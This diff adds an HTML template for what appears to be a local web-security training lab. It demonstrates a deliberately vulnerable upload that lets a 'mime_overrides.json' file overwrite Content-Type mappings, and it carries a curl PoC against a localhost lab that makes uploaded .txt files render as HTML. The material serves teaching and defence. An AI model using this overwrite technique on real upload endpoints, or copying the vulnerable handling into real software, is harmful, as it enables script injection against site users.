@@ -1,0 +1,30 @@
+{% extends 'base.html' %}
+{% block title %}{{ lab.title }}{% endblock %}
+{% block content %}
+{% include 'shared_lab_header.html' %}
+<div class="workbench two-col wide-layout">
+  <section class="console-card">
+    <h2>覆盖 mime_overrides.json（模拟 .htaccess）</h2>
+    <pre class="code-panel">vuln：允许任意文件名上传；如果文件名 == "mime_overrides.json"，
+直接覆盖 data/mime_overrides.json。后续 /uploads/public/<id> 在 vuln 模式
+会优先采用此映射作为 Content-Type。
+safe：拒绝以 . 开头的隐藏文件 + 关键配置文件名。
+
+PoC（让所有 .txt 都按 text/html 解析）：
+  echo '{".txt":"text/html"}' > /tmp/mime_overrides.json
+  curl -F 'upload_file=@/tmp/mime_overrides.json' \
+       'http://127.0.0.1:5070/labs/upload/htaccess-overwrite?mode=vuln'
+然后访问任何已上传的 .txt：浏览器把它当 HTML 渲染。
+重置：./scripts/reset_lab.sh upload-public</pre>
+    <form method="post" action="?mode={{ mode }}" enctype="multipart/form-data" class="form-grid">
+      <label>upload_file<input type="file" name="upload_file"></label>
+      <button class="button-primary" type="submit">上传</button>
+    </form>
+    {% if message %}<div class="result-banner warning">{{ message }}</div>{% endif %}
+    {% if error %}<pre class="error-box">{{ error }}</pre>{% endif %}
+    <h3>当前 mime_overrides.json 内容</h3>
+    <pre class="code-panel">{{ overrides | tojson(indent=2) }}</pre>
+  </section>
+</div>
+{% include 'shared_hints.html' %}
+{% endblock %}
